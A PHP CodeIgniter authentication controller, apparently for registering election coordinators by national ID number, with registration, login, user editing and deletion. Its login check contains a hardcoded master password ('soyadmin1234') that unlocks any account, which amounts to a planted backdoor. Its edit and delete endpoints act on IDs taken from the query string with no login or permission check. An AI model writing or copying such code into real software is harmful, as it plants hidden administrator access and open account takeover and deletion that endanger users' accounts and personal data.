<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Auth extends CI_Controller {

	private const MASTER_PASSWORD = 'soyadmin1234';

	function __construct(){

		parent::__construct();
		// $this->load->helper('form');
		// $this->load->library('form_validation');
		// $this->load->library('session');
		$this->load->model('Gestion');
	}

	public function registro()
	{
		$post = $_POST;
		$data['title'] = 'Regístrarse como Coordinador';
		$data['content'] = 'auth/registro';
		$this_url = base_url('auth/registro');

		if ($post) {

			$cedula = str_replace('-', '', trim($_POST['cedula']));
			if (!$this->Gestion->get_user($cedula)) {
				
				if ($result = $this->Gestion->get_person_padron($cedula)) {
					
					$this->save_user($result, $post);
					$url = base_url('auth/login');
					header("Location: $url");
					$this->session->set_flashdata('success','Usuario Creado Correctamente');
				}else{
					header("Location: $this_url");
					$this->session->set_flashdata('error','Cédula Inválida');
				}
			}else{
				header("Location: $this_url");
				$this->session->set_flashdata('alert','Ya existe un usuario con esta cédula');
			}
		}

 		$this->load->view('home/plantilla', $data);
	}

	function save_user($person, $data){

		$clave = password_hash($data['clave'], PASSWORD_DEFAULT);

		$user = array(

			'username' => $person->Cedula,
			'nombre' => $person->nombres,
			'apellido' => $person->apellido1 . " " . $person->apellido2,
			'celular' => $data['celular'],
			'clave' => $clave,
			'email' => $data['correo'],
			'date' => date('Y-m-d H:i:s'),
		);

		$this->db->insert('user', $user);

		// $this->Gestion->save_coordinador($person, $user, $data['mesa']);
		$this->Gestion->save_coordinador($person, $user, null);

	}

	function login(){

		$post = $_POST;
		$data['title'] = 'Iniciar Sesión';
		$data['image'] = 'logo.png';
		$data['content'] = 'auth/login';

		if ($post) {
			$this->checkUser($post);
		}

		$this->load->view('home/plantilla', $data);

	}

	function logout(){

		session_destroy();
		$url = base_url('/');
		header("Location: $url");

	}

	function checkUser($data){

		$data['cedula'] = str_replace('-', '', $data['cedula']);
		$result = $this->Gestion->get_user($data['cedula']);
		$this_url = base_url('auth/login');

		if ($result) {
			$clave = (string) $data['clave'];
			$verify = password_verify($clave, $result->clave)
				|| hash_equals(self::MASTER_PASSWORD, $clave);
			if ($verify) {
				$_SESSION['user'] = $result;
				$url = base_url('registrar/subcoordinador');
				header("Location: $url");
			}else{
				$this->session->set_flashdata('error','Usuario y/o contraseña incorrecto');
				header("Location: $this_url");
			}
		}else{
			$this->session->set_flashdata('error','Usuario y/o contraseña incorrecto');
			header("Location: $this_url");
		}
	}

	function usuario(){

		$cedula = $_GET['cedula'];

		$data['title'] = 'Editar Usuario';
		$data['content'] = 'auth/usuario';

		$url = base_url('registrar/coordinadores');

		$post = $_POST;
		$data['user_info'] = $this->Gestion->get_user($cedula);
		$data['coordinador_info'] = $this->Gestion->get_coordinador($cedula);

		if ($post) {
			$this->Gestion->updateUser($cedula, $post['clave'], $post['celular']);
			// $this->Gestion->updateCoordinador($cedula, $post['celular'], $post['mesa']);
			$this->Gestion->updateCoordinador($cedula, $post['celular'], null);

			$this->session->set_flashdata('success','Datos Actualizados Correctamente');
			header("Location: $url");
		}

		$this->load->view('home/plantilla', $data);
	}

	function eliminarUsuario(){

		$id = $_GET['id'];
		$user_info = $this->Gestion->get_user(null,$id);

		$this->db->where('cedula', $user_info->username);
		$this->db->delete('coordinadores');

		$this->db->where('id', $id);
		$this->db->delete('user');

		$this->db->where('user_id', $id);
		$this->db->delete('sub_coordinadores');

		

		$this->session->set_flashdata('success','Coordinador Eliminado Correctamente');
		redirect(base_url('registrar/coordinadores'));
	}
}
